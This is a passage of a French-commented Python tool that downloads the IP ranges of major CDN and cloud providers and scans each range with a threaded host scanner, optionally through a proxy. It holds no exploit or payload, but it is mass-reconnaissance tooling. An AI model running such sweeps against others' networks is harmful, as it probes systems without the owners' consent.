        print(Fore.CYAN + " 2. ‚ñ∂Ô∏è  Reprendre le scan pr√©c√©dent")
        print(Fore.CYAN + " 3. ‚ôªÔ∏è  Actualiser les CIDR Cloudflare")
        print(Fore.CYAN + " 4. ‚Ü©Ô∏è  Retour")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")

        if choice == "1":
            if os.path.exists(CLOUDFLARE_SCAN_PROGRESS_FILE):
                os.remove(CLOUDFLARE_SCAN_PROGRESS_FILE)
            if update_cloudflare_cidrs():
                start_cloudflare_scan(proxy=proxy)
        elif choice == "2":
            start_cloudflare_scan(resume=True, proxy=proxy)
        elif choice == "3":
            update_cloudflare_cidrs()
        elif choice == "4":
            break
        else:
            print(Fore.RED + "‚ùå Option invalide.")

def start_cloudflare_scan(resume=False, proxy=None):
    if not os.path.exists(CLOUDFLARE_CIDR_FILE):
        print(Fore.RED + f"‚ùå Le fichier {CLOUDFLARE_CIDR_FILE} est introuvable.")
        return

    with open(CLOUDFLARE_CIDR_FILE, 'r') as f:
        all_cidrs = [line.strip() for line in f if line.strip()]

    scanned = set()
    if resume and os.path.exists(CLOUDFLARE_SCAN_PROGRESS_FILE):
        with open(CLOUDFLARE_SCAN_PROGRESS_FILE, 'r') as f:
            scanned = {line.strip() for line in f if line.strip()}

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]

    if not to_scan:
        print(Fore.GREEN + "‚úÖ Toutes les plages Cloudflare ont √©t√© scann√©es.")
        return

    print(Fore.CYAN + f"üå© D√©but du scan Cloudflare ({len(to_scan)} plages restantes) avec {Fore.YELLOW}{proxy if proxy else 'aucun proxy'}")

    try:
        for cidr in to_scan:
            print(Fore.MAGENTA + f"\n=== SCAN CLOUDFLARE DE {cidr} ===")
            scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=100,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()

            with open(CLOUDFLARE_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

            ask_for_rescan(scanner)

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n‚è∏ Scan interrompu.")
    except Exception as e:
        print(Fore.RED + f"\n‚ùå Erreur Cloudflare : {str(e)}")
    finally:
        print(Fore.CYAN + f"\nüìä Progression sauvegard√©e")
        
def cloudflare_menu():
    """Menu interactif Cloudflare"""
    print(Fore.MAGENTA + "\n=== MENU CLOUDFLARE ===")
    print(Fore.CYAN + "1. Nouveau scan complet")
    print(Fore.CYAN + "2. Reprendre le scan pr√©c√©dent")
    print(Fore.CYAN + "3. Mettre √† jour les plages CIDR")
    print(Fore.CYAN + "4. Retour au menu principal")
    choice = input(Fore.YELLOW + "Choix (1-4) : ")
    return choice

# ==============================================
# CONFIGURATION CLOUDFRONT
# ==============================================

CLOUDFRONT_CIDR_FILE = "cloudfront_cidrs.txt"
CLOUDFRONT_SCAN_PROGRESS_FILE = "cloudfront_scan_progress.txt"

# ==============================================
# FONCTIONS CLOUDFRONT
# ==============================================

def fetch_cloudfront_cidrs():
    """R√©cup√®re les plages CIDR depuis l'API AWS"""
    print(Fore.CYAN + "üîç R√©cup√©ration des plages CIDR CloudFront...")
    try:
        response = requests.get(
            'https://ip-ranges.amazonaws.com/ip-ranges.json',
            timeout=15
        )
        if response.status_code == 200:
            data = response.json()
            return [prefix['ip_prefix'] for prefix in data['prefixes'] 
                if prefix['service'] == 'CLOUDFRONT']
        print(Fore.RED + "‚ùå R√©ponse API invalide")
    except Exception as e:
        print(Fore.RED + f"‚ùå Erreur API: {str(e)}")
    return []

def update_cloudfront_cidrs():
    """Met √† jour le fichier des plages CIDR"""
    cidrs = fetch_cloudfront_cidrs()
    if not cidrs:
        print(Fore.RED + "‚ùå Aucune plage CIDR r√©cup√©r√©e")
        return False
    
    with open(CLOUDFRONT_CIDR_FILE, 'w') as f:
        f.write("\n".join(cidrs) + "\n")
    print(Fore.GREEN + f"‚úÖ {len(cidrs)} plages CIDR sauvegard√©es")
    return True

def scan_cloudfront_range(cidr, threads=100):
    """Lance un scan sur une plage CIDR sp√©cifique"""
    print(Fore.MAGENTA + f"\n=== SCAN DE {cidr} ===")
    scanner = HostScanner(
        filename=None,
        ip_range=cidr,
        threads=threads,
        ping_timeout=1,
        http_timeout=10
    )
    scanner.run()

def manage_cloudfront_scan(proxy=None):
    if not os.path.exists(CLOUDFRONT_CIDR_FILE):
        print(Fore.YELLOW + "‚Ñπ Mise √† jour initiale des CIDR CloudFront...")
        if not update_cloudfront_cidrs():
            return

    while True:
        print(Fore.LIGHTBLUE_EX + "\n‚òÅÔ∏è CLOUDFRONT ‚Äî MENU D'ANALYSE")
        print(Fore.LIGHTBLUE_EX + "=" * 40)
        print(Fore.CYAN + " 1. üåê Nouveau scan complet")
        print(Fore.CYAN + " 2. ‚ñ∂Ô∏è  Reprise du scan pr√©c√©dent")
        print(Fore.CYAN + " 3. üîÅ Mise √† jour des CIDR CloudFront")
        print(Fore.CYAN + " 4. ‚Ü©Ô∏è  Retour")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")

        if choice == "1":
            if os.path.exists(CLOUDFRONT_SCAN_PROGRESS_FILE):
                os.remove(CLOUDFRONT_SCAN_PROGRESS_FILE)
            if update_cloudfront_cidrs():
                scanner = start_cloudfront_scan(proxy=proxy)
                if scanner:
                    ask_for_rescan(scanner)
        elif choice == "2":
            scanner = start_cloudfront_scan(resume=True, proxy=proxy)
            if scanner:
                ask_for_rescan(scanner)
        elif choice == "3":
            update_cloudfront_cidrs()
        elif choice == "4":
            break
        else:
            print(Fore.RED + "‚ùå Choix invalide.")

def start_cloudfront_scan(resume=False, proxy=None):
    if not os.path.exists(CLOUDFRONT_CIDR_FILE):
        print(Fore.RED + f"‚ùå Le fichier {CLOUDFRONT_CIDR_FILE} est introuvable.")
        return

    with open(CLOUDFRONT_CIDR_FILE, 'r') as f:
        all_cidrs = [line.strip() for line in f if line.strip()]

    scanned = set()
    if resume and os.path.exists(CLOUDFRONT_SCAN_PROGRESS_FILE):
        with open(CLOUDFRONT_SCAN_PROGRESS_FILE, 'r') as f:
            scanned = {line.strip() for line in f if line.strip()}

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]

    if not to_scan:
        print(Fore.GREEN + "‚úÖ Toutes les plages CloudFront ont √©t√© scann√©es.")
        return

    print(Fore.CYAN + f"üöÄ D√©but du scan CloudFront ({len(to_scan)} plages restantes) avec {Fore.YELLOW}{proxy if proxy else 'aucun proxy'}")

    try:
        for cidr in to_scan:
            print(Fore.MAGENTA + f"\n=== SCAN CLOUDFRONT DE {cidr} ===")
            scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=100,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()

            with open(CLOUDFRONT_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

            ask_for_rescan(scanner)

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n‚è∏ Scan interrompu.")
    except Exception as e:
        print(Fore.RED + f"\n‚ùå Erreur CloudFront : {str(e)}")
    finally:
        print(Fore.CYAN + f"\nüìä Progression sauvegard√©e")

def cloudfront_menu():
    """Menu interactif CloudFront"""
    print(Fore.MAGENTA + "\n=== MENU CLOUDFRONT ===")
    print(Fore.CYAN + "1. Nouveau scan complet")
    print(Fore.CYAN + "2. Reprendre le scan pr√©c√©dent")
    print(Fore.CYAN + "3. Mettre √† jour les plages CIDR")
    print(Fore.CYAN + "4. Retour au menu principal")
    choice = input(Fore.YELLOW + "Choix (1-4) : ")
    return choice

# ==============================================
# CONFIGURATION GOOGLE CLOUD
# ==============================================
GOOGLE_CIDR_FILE = "cidrs/googlecloud_cidrs.txt"
GOOGLE_SCAN_PROGRESS_FILE = "progress/googlecloud_progress.txt"
# ==============================================
# FONCTIONS GOOGLE CLOUD
# ==============================================

def fetch_googlecloud_cidrs():
    """R√©cup√®re les plages CIDR Google Cloud via l'API officielle et ASN multiples"""
    print(Fore.CYAN + "üîç R√©cup√©ration des plages CIDR Google Cloud (API + ASN)...")
    cidrs = []

    # API officielle
    try:
        response = requests.get("https://www.gstatic.com/ipranges/cloud.json", timeout=15)
        response.raise_for_status()
        data = response.json()
        for item in data.get("prefixes", []):
            if "ipv4Prefix" in item:
                cidrs.append(item["ipv4Prefix"])
        print(Fore.GREEN + f"  ‚úÖ Google API ‚Üí {len(cidrs)} CIDR")
    except Exception as e:
        print(Fore.RED + f"‚ùå Erreur API Google Cloud : {e}")

    # Compl√©ment ASN
    try:
        asn_cidrs = fetch_cidrs_multi_asn([15169, 139070, 396982])
        cidrs.extend(asn_cidrs)
    except Exception as e:
        print(Fore.RED + f"‚ùå Erreur ASN Google Cloud : {e}")

    final = list(set(cidrs))
    print(Fore.GREEN + f"‚úÖ Total unique CIDR Google Cloud : {len(final)}")
    return final
    
import os

def update_googlecloud_cidrs():
    cidrs = fetch_googlecloud_cidrs()
    if not cidrs:
        print(Fore.RED + "‚ùå Aucune plage CIDR Google Cloud r√©cup√©r√©e.")
        return False

    # Assure-toi que le dossier existe avant d‚Äô√©crire dedans
    os.makedirs(os.path.dirname(GOOGLE_CIDR_FILE), exist_ok=True)

    with open(GOOGLE_CIDR_FILE, 'w') as f:
        f.write("\n".join(cidrs) + "\n")

    print(Fore.GREEN + f"‚úÖ {len(cidrs)} plages CIDR Google Cloud sauvegard√©es.")
    return True
    
def start_googlecloud_scan(resume=False, proxy=None):
    if not os.path.exists(GOOGLE_CIDR_FILE):
        print(Fore.RED + f"‚ùå Le fichier {GOOGLE_CIDR_FILE} est introuvable.")
        return

    with open(GOOGLE_CIDR_FILE, 'r') as f:
        all_cidrs = [line.strip() for line in f if line.strip()]

    scanned = set()
    if resume and os.path.exists(GOOGLE_SCAN_PROGRESS_FILE):
        with open(GOOGLE_SCAN_PROGRESS_FILE, 'r') as f:
            scanned = {line.strip() for line in f if line.strip()}

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]

    if not to_scan:
        print(Fore.GREEN + "‚úÖ Toutes les plages Google Cloud ont √©t√© scann√©es.")
        return

    print(Fore.CYAN + f"‚òÅÔ∏è D√©but du scan Google Cloud ({len(to_scan)} plages restantes) avec {Fore.YELLOW}{proxy if proxy else 'aucun proxy'}")

    try:
        for cidr in to_scan:
            print(Fore.MAGENTA + f"\n=== SCAN GOOGLE CLOUD DE {cidr} ===")
            scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=100,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()

            with open(GOOGLE_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

            ask_for_rescan(scanner)

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n‚è∏ Scan interrompu.")
    except Exception as e:
        print(Fore.RED + f"\n‚ùå Erreur Google Cloud : {str(e)}")
    finally:
        print(Fore.CYAN + f"\nüìä Progression sauvegard√©e")
            
def gcp_menu():
    print(Fore.MAGENTA + "\n=== MENU GCP CLOUD ===")
    print(Fore.CYAN + "1. Nouveau scan complet")
    print(Fore.CYAN + "2. Reprendre le scan pr√©c√©dent")
    print(Fore.CYAN + "3. Mettre √† jour les plages CIDR")
    print(Fore.CYAN + "4. Retour au menu principal")
    return input(Fore.YELLOW + "Choix (1-4) : ")

def manage_googlecloud_scan(proxy=None):
    if not os.path.exists(GOOGLE_CIDR_FILE):
        print(Fore.YELLOW + "‚Ñπ Mise √† jour initiale des CIDR Google Cloud...")
        if not update_googlecloud_cidrs():
            return

    while True:
        print(Fore.LIGHTBLUE_EX + "\n‚òÅÔ∏è GOOGLE CLOUD ‚Äî MENU D'ANALYSE")
        print(Fore.LIGHTBLUE_EX + "=" * 40)
        print(Fore.CYAN + " 1. üåê Nouveau scan complet")
        print(Fore.CYAN + " 2. ‚ñ∂Ô∏è  Reprise du scan pr√©c√©dent")
        print(Fore.CYAN + " 3. üîÅ Mise √† jour des CIDR Google Cloud")
        print(Fore.CYAN + " 4. ‚Ü©Ô∏è  Retour")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")

        if choice == "1":
            if os.path.exists(GOOGLE_SCAN_PROGRESS_FILE):
                os.remove(GOOGLE_SCAN_PROGRESS_FILE)
            if update_google_cidrs():
                scanner = start_googlecloud_scan(proxy=proxy)
                if scanner:
                    ask_for_rescan(scanner)
        elif choice == "2":
            scanner = start_googlecloud_scan(resume=True, proxy=proxy)
            if scanner:
                ask_for_rescan(scanner)
        elif choice == "3":
            update_google_cidrs()
        elif choice == "4":
            break
        else:
            print(Fore.RED + "‚ùå Choix invalide.")
            
# ==============================================
# CONFIGURATION FASTLY
# ==============================================
FASTLY_CIDR_FILE = "fastly_cidrs.txt"
FASTLY_SCAN_PROGRESS_FILE = "fastly_scan_progress.txt"
# ==============================================
# FONCTIONS FASTLY
# ==============================================

def fetch_fastly_cidrs():
    """R√©cup√®re les plages CIDR Fastly via API publique et ASN 54113"""
    print(Fore.CYAN + "üîç R√©cup√©ration des plages CIDR Fastly (API + ASN)...")
    cidrs = []

    # API officielle
    try:
        response = requests.get("https://api.fastly.com/public-ip-list", timeout=15)
        response.raise_for_status()
        data = response.json()
        api_cidrs = data.get("addresses", [])
        cidrs.extend(api_cidrs)
        print(Fore.GREEN + f"  ‚úÖ Fastly API ‚Üí {len(api_cidrs)} CIDR")
    except Exception as e:
        print(Fore.RED + f"‚ùå Erreur API Fastly : {e}")

    # Compl√©ment ASN
    try:
        asn_cidrs = fetch_cidrs_multi_asn([54113])
        cidrs.extend(asn_cidrs)
    except Exception as e:
        print(Fore.RED + f"‚ùå Erreur ASN Fastly : {e}")

    final = list(set(cidrs))
    print(Fore.GREEN + f"‚úÖ Total unique CIDR Fastly : {len(final)}")
    return final
    
def update_fastly_cidrs():
    cidrs = fetch_fastly_cidrs()
    if not cidrs:
        print(Fore.RED + "‚ùå Aucune plage CIDR Fastly r√©cup√©r√©e.")
        return False
    with open(FASTLY_CIDR_FILE, 'w') as f:
        f.write("\n".join(cidrs) + "\n")
    print(Fore.GREEN + f"‚úÖ {len(cidrs)} plages CIDR Fastly sauvegard√©es.")
    return True
    
def start_fastly_scan(resume=False, proxy=None):
    if not os.path.exists(FASTLY_CIDR_FILE):
        print(Fore.RED + f"‚ùå Le fichier {FASTLY_CIDR_FILE} est introuvable.")
        return

    with open(FASTLY_CIDR_FILE, 'r') as f:
        all_cidrs = [line.strip() for line in f if line.strip()]

    scanned = set()
    if resume and os.path.exists(FASTLY_SCAN_PROGRESS_FILE):
        with open(FASTLY_SCAN_PROGRESS_FILE, 'r') as f:
            scanned = {line.strip() for line in f if line.strip()}

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]

    if not to_scan:
        print(Fore.GREEN + "‚úÖ Toutes les plages Fastly ont √©t√© scann√©es.")
        return

    print(Fore.CYAN + f"‚ö° D√©but du scan Fastly ({len(to_scan)} plages restantes) avec {Fore.YELLOW}{proxy if proxy else 'aucun proxy'}")

    try:
        for cidr in to_scan:
            print(Fore.MAGENTA + f"\n=== SCAN FASTLY DE {cidr} ===")
            scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=100,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()

            with open(FASTLY_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

            ask_for_rescan(scanner)

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n‚è∏ Scan interrompu.")
    except Exception as e:
        print(Fore.RED + f"\n‚ùå Erreur Fastly : {str(e)}")
    finally:
        print(Fore.CYAN + f"\nüìä Progression sauvegard√©e")
        
def fastly_menu():
    print(Fore.MAGENTA + "\n=== MENU FASTLY ===")
    print(Fore.CYAN + "1. Nouveau scan complet")
    print(Fore.CYAN + "2. Reprendre le scan pr√©c√©dent")
    print(Fore.CYAN + "3. Mettre √† jour les IPs Fastly")
    print(Fore.CYAN + "4. Retour au menu principal")
    return input(Fore.YELLOW + "Choix (1-4) : ")

def manage_fastly_scan(proxy=None):
    if not os.path.exists(FASTLY_CIDR_FILE):
        print(Fore.YELLOW + "‚Ñπ Mise √† jour initiale des CIDR Fastly...")
        if not update_fastly_cidrs():
            return

    while True:
        print(Fore.LIGHTBLUE_EX + "\n‚òÅÔ∏è FASTLY ‚Äî MENU D'ANALYSE")
        print(Fore.LIGHTBLUE_EX + "=" * 40)
        print(Fore.CYAN + " 1. üåê Nouveau scan complet")
        print(Fore.CYAN + " 2. ‚ñ∂Ô∏è  Reprise du scan pr√©c√©dent")
        print(Fore.CYAN + " 3. üîÅ Mise √† jour des CIDR Fastly")
        print(Fore.CYAN + " 4. ‚Ü©Ô∏è  Retour")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")

        if choice == "1":
            if os.path.exists(FASTLY_SCAN_PROGRESS_FILE):
                os.remove(FASTLY_SCAN_PROGRESS_FILE)
            if update_fastly_cidrs():
                scanner = start_fastly_scan(proxy=proxy)
                if scanner:
                    ask_for_rescan(scanner)
        elif choice == "2":
            scanner = start_fastly_scan(resume=True, proxy=proxy)
            if scanner:
                ask_for_rescan(scanner)
        elif choice == "3":
            update_fastly_cidrs()
        elif choice == "4":
            break
        else:
            print(Fore.RED + "‚ùå Choix invalide.")
            
# ==============================================
# CONFIGURATION AKAMAI, AZURE, STACKPATH
# ==============================================
AKAMAI_CIDR_FILE = "akamai_cidrs.txt"
AKAMAI_SCAN_PROGRESS_FILE = "akamai_scan_progress.txt"

AZURE_CIDR_FILE = "azure_cidrs.txt"
AZURE_SCAN_PROGRESS_FILE = "azure_scan_progress.txt"

STACKPATH_CIDR_FILE = "stackpath_cidrs.txt"
STACKPATH_SCAN_PROGRESS_FILE = "stackpath_scan_progress.txt"

GCORE_CIDR_FILE = "gcore_cidrs.txt"
GCORE_SCAN_PROGRESS_FILE = "gcore_scan_progress.txt"
# ==============================================
# FONCTIONS AKAMAI, AZURE, STACKPATH
# ==============================================

def fetch_akamai_cidrs():
    cidrs = fetch_cidrs_multi_asn([20940, 12222])
    if not cidrs:
        print(Fore.YELLOW + "‚û°Ô∏è Utilisation de plages CIDR statiques Akamai.")
        return [
            "23.32.0.0/11",
            "23.0.0.0/12",
            "23.192.0.0/11",
            "184.24.0.0/13"
        ]
    return cidrs
        
def fetch_azure_cidrs():
    cidrs = fetch_cidrs_multi_asn([8075, 8068])
    if not cidrs:
        print(Fore.YELLOW + "‚û°Ô∏è Utilisation de plages CIDR statiques Azure.")
        return [
            "13.104.0.0/14",
            "40.74.0.0/15",
            "40.112.0.0/13",
            "52.96.0.0/14",
            "52.108.0.0/15",
            "52.136.0.0/13",
            "104.208.0.0/13"
        ]
    return cidrs
    
def fetch_stackpath_cidrs():
    cidrs = fetch_cidrs_multi_asn([54113])
    if not cidrs:
        print(Fore.YELLOW + "‚û°Ô∏è Utilisation de plages CIDR statiques StackPath.")
        return [
            "151.139.0.0/16",
            "192.16.48.0/20",
            "190.93.240.0/20"
        ]
    return cidrs

def fetch_gcore_cidrs():
    cidrs = fetch_cidrs_multi_asn([199524])
    if not cidrs:
        print(Fore.YELLOW + "‚û°Ô∏è Utilisation de plages CIDR statiques GCore.")
        return [
            "92.223.64.0/19",
            "92.223.88.0/21",
            "92.223.96.0/22",
            "92.223.100.0/23"
        ]
    return cidrs

def update_akamai_cidrs():
    cidrs = fetch_akamai_cidrs()
    if not cidrs:
        print(Fore.RED + "‚ùå Aucune plage CIDR Akamai r√©cup√©r√©e.")
        return False
    with open(AKAMAI_CIDR_FILE, 'w') as f:
        f.write("\n".join(cidrs) + "\n")
    print(Fore.GREEN + f"‚úÖ {len(cidrs)} plages CIDR Akamai sauvegard√©es.")
    return True
    
def update_azure_cidrs():
    cidrs = fetch_azure_cidrs()
    if not cidrs:
        print(Fore.RED + "‚ùå Aucune plage CIDR Azure r√©cup√©r√©e.")
        return False
    with open(AZURE_CIDR_FILE, 'w') as f:
        f.write("\n".join(cidrs) + "\n")
    print(Fore.GREEN + f"‚úÖ {len(cidrs)} plages CIDR Azure sauvegard√©es.")
    return True
    
def update_stackpath_cidrs():
    cidrs = fetch_stackpath_cidrs()
    if not cidrs:
        print(Fore.RED + "‚ùå Aucune plage CIDR StackPath r√©cup√©r√©e.")
        return False
    with open(STACKPATH_CIDR_FILE, 'w') as f:
        f.write("\n".join(cidrs) + "\n")
    print(Fore.GREEN + f"‚úÖ {len(cidrs)} plages CIDR StackPath sauvegard√©es.")
    return True

def update_gcore_cidrs():
    cidrs = fetch_gcore_cidrs()
    if not cidrs:
        print(Fore.RED + "‚ùå Aucune plage CIDR GCore r√©cup√©r√©e.")
        return False
    with open(GCORE_CIDR_FILE, 'w') as f:
        f.write("\n".join(cidrs) + "\n")
    print(Fore.GREEN + f"‚úÖ {len(cidrs)} plages CIDR GCore sauvegard√©es.")
    return True
    
def start_akamai_scan(resume=False, proxy=None):
    if not os.path.exists(AKAMAI_CIDR_FILE):
        print(Fore.RED + f"‚ùå Le fichier {AKAMAI_CIDR_FILE} est introuvable.")
        return

    with open(AKAMAI_CIDR_FILE, 'r') as f:
        all_cidrs = [line.strip() for line in f if line.strip()]

    scanned = set()
    if resume and os.path.exists(AKAMAI_SCAN_PROGRESS_FILE):
        with open(AKAMAI_SCAN_PROGRESS_FILE, 'r') as f:
            scanned = {line.strip() for line in f if line.strip()}

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]

    if not to_scan:
        print(Fore.GREEN + "‚úÖ Toutes les plages Akamai ont √©t√© scann√©es.")
        return

    print(Fore.CYAN + f"üåÄ D√©but du scan Akamai ({len(to_scan)} plages restantes) avec {Fore.YELLOW}{proxy if proxy else 'aucun proxy'}")

    try:
        for cidr in to_scan:
            print(Fore.MAGENTA + f"\n=== SCAN AKAMAI DE {cidr} ===")
            scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=100,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()

            with open(AKAMAI_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

            ask_for_rescan(scanner)

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n‚è∏ Scan interrompu.")
    except Exception as e:
        print(Fore.RED + f"\n‚ùå Erreur Akamai : {str(e)}")
    finally:
        print(Fore.CYAN + f"\nüìä Progression sauvegard√©e")
        
def start_azure_scan(resume=False, proxy=None):
    if not os.path.exists(AZURE_CIDR_FILE):
        print(Fore.RED + f"‚ùå Le fichier {AZURE_CIDR_FILE} est introuvable.")
        return

    with open(AZURE_CIDR_FILE, 'r') as f:
        all_cidrs = [line.strip() for line in f if line.strip()]

    scanned = set()
    if resume and os.path.exists(AZURE_SCAN_PROGRESS_FILE):
        with open(AZURE_SCAN_PROGRESS_FILE, 'r') as f:
            scanned = {line.strip() for line in f if line.strip()}

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]

    if not to_scan:
        print(Fore.GREEN + "‚úÖ Toutes les plages Azure ont √©t√© scann√©es.")
        return

    print(Fore.CYAN + f"‚òÅÔ∏è D√©but du scan Azure ({len(to_scan)} plages restantes) avec {Fore.YELLOW}{proxy if proxy else 'aucun proxy'}")

    try:
        for cidr in to_scan:
            print(Fore.MAGENTA + f"\n=== SCAN AZURE DE {cidr} ===")
            scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=100,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()

            with open(AZURE_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

            ask_for_rescan(scanner)

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n‚è∏ Scan interrompu.")
    except Exception as e:
        print(Fore.RED + f"\n‚ùå Erreur Azure : {str(e)}")
    finally:
        print(Fore.CYAN + f"\nüìä Progression sauvegard√©e")
        
def start_stackpath_scan(resume=False, proxy=None):
    if not os.path.exists(STACKPATH_CIDR_FILE):
        print(Fore.RED + f"‚ùå Le fichier {STACKPATH_CIDR_FILE} est introuvable.")
        return

    with open(STACKPATH_CIDR_FILE, 'r') as f:
        all_cidrs = [line.strip() for line in f if line.strip()]

    scanned = set()
    if resume and os.path.exists(STACKPATH_SCAN_PROGRESS_FILE):
        with open(STACKPATH_SCAN_PROGRESS_FILE, 'r') as f:
            scanned = {line.strip() for line in f if line.strip()}

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]

    if not to_scan:
        print(Fore.GREEN + "‚úÖ Toutes les plages StackPath ont √©t√© scann√©es.")
        return

    print(Fore.CYAN + f"üß± D√©but du scan StackPath ({len(to_scan)} plages restantes) avec {Fore.YELLOW}{proxy if proxy else 'aucun proxy'}")

    try:
        for cidr in to_scan:
            print(Fore.MAGENTA + f"\n=== SCAN STACKPATH DE {cidr} ===")
            scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=100,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()

            with open(STACKPATH_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

            ask_for_rescan(scanner)

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n‚è∏ Scan interrompu.")
    except Exception as e:
        print(Fore.RED + f"\n‚ùå Erreur StackPath : {str(e)}")
    finally:
        print(Fore.CYAN + f"\nüìä Progression sauvegard√©e")

def start_gcore_scan(resume=False, proxy=None):
    """Ex√©cute le scan GCore avec gestion de la reprise et proxy (sans re-scan int√©gr√©)"""

    if not os.path.exists(GCORE_CIDR_FILE):
        print(Fore.YELLOW + "‚Ñπ Aucun fichier CIDR GCore trouv√©, mise √† jour...")
        if not update_gcore_cidrs():
            return None

    with open(GCORE_CIDR_FILE, 'r') as f:
        all_cidrs = [line.strip() for line in f if line.strip()]

    scanned = set()
    if resume and os.path.exists(GCORE_SCAN_PROGRESS_FILE):
        with open(GCORE_SCAN_PROGRESS_FILE, 'r') as f:
            scanned = {line.strip() for line in f if line.strip()}

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]

    if not to_scan:
        print(Fore.GREEN + "‚úÖ Toutes les plages GCore ont √©t√© scann√©es.")
        return None

    print(Fore.CYAN + f"üåê D√©but du scan GCore ({len(to_scan)} plages restantes) avec " +
          f"{Fore.YELLOW}{proxy if proxy else 'aucun proxy'}")

    try:
        for cidr in to_scan:
            print(Fore.MAGENTA + f"\n=== SCAN GCORE DE {cidr} ===")
            scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=100,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()

            with open(GCORE_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n‚è∏ Scan interrompu par l'utilisateur.")
        return scanner if 'scanner' in locals() else None
    except Exception as e:
        print(Fore.RED + f"\n‚ùå Erreur GCore : {str(e)}")
        return scanner if 'scanner' in locals() else None
    finally:
        print(Fore.CYAN + "\nüìä Progression sauvegard√©e")

    return scanner
        
def akamai_menu():
    print(Fore.MAGENTA + "\n=== MENU AKAMAI ===")
    print(Fore.CYAN + "1. Nouveau scan complet")
    print(Fore.CYAN + "2. Reprendre le scan pr√©c√©dent")
    print(Fore.CYAN + "3. Mettre √† jour les plages CIDR")
    print(Fore.CYAN + "4. Retour")
    return input(Fore.YELLOW + "Choix (1-4) : ")
    
def azure_menu():
    print(Fore.MAGENTA + "\n=== MENU AZURE ===")
    print(Fore.CYAN + "1. Nouveau scan complet")
    print(Fore.CYAN + "2. Reprendre le scan pr√©c√©dent")
    print(Fore.CYAN + "3. Mettre √† jour les plages CIDR")
    print(Fore.CYAN + "4. Retour")
    return input(Fore.YELLOW + "Choix (1-4) : ")
    
def stackpath_menu():
    print(Fore.MAGENTA + "\n=== MENU STACKPATH ===")
    print(Fore.CYAN + "1. Nouveau scan complet")
    print(Fore.CYAN + "2. Reprendre le scan pr√©c√©dent")
    print(Fore.CYAN + "3. Mettre √† jour les plages CIDR")
    print(Fore.CYAN + "4. Retour")
    return input(Fore.YELLOW + "Choix (1-4) : ")

def gcore_menu():
    print(Fore.MAGENTA + "\n=== MENU GCORE ===")
    print(Fore.CYAN + "1. Nouveau scan complet")
    print(Fore.CYAN + "2. Reprendre le scan pr√©c√©dent")
    print(Fore.CYAN + "3. Mettre √† jour les plages CIDR")
    print(Fore.CYAN + "4. Retour au menu principal")
    return input(Fore.YELLOW + "Choix (1-4) : ")

def manage_akamai_scan(proxy=None):
    if not os.path.exists(AKAMAI_CIDR_FILE):
        print(Fore.YELLOW + "‚Ñπ Mise √† jour initiale des CIDR Akamai...")
        if not update_akamai_cidrs():
            return

    while True:
        print(Fore.LIGHTBLUE_EX + "\n‚òÅÔ∏è AKAMAI ‚Äî MENU D'ANALYSE")
        print(Fore.LIGHTBLUE_EX + "=" * 40)
        print(Fore.CYAN + " 1. üåê Nouveau scan complet")
        print(Fore.CYAN + " 2. ‚ñ∂Ô∏è  Reprise du scan pr√©c√©dent")
        print(Fore.CYAN + " 3. üîÅ Mise √† jour des CIDR Akamai")
        print(Fore.CYAN + " 4. ‚Ü©Ô∏è  Retour")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")

        if choice == "1":
            if os.path.exists(AKAMAI_SCAN_PROGRESS_FILE):
                os.remove(AKAMAI_SCAN_PROGRESS_FILE)
            if update_akamai_cidrs():
                scanner = start_akamai_scan(proxy=proxy)
                if scanner:
                    ask_for_rescan(scanner)
        elif choice == "2":
            scanner = start_akamai_scan(resume=True, proxy=proxy)
            if scanner:
                ask_for_rescan(scanner)
        elif choice == "3":
            update_akamai_cidrs()
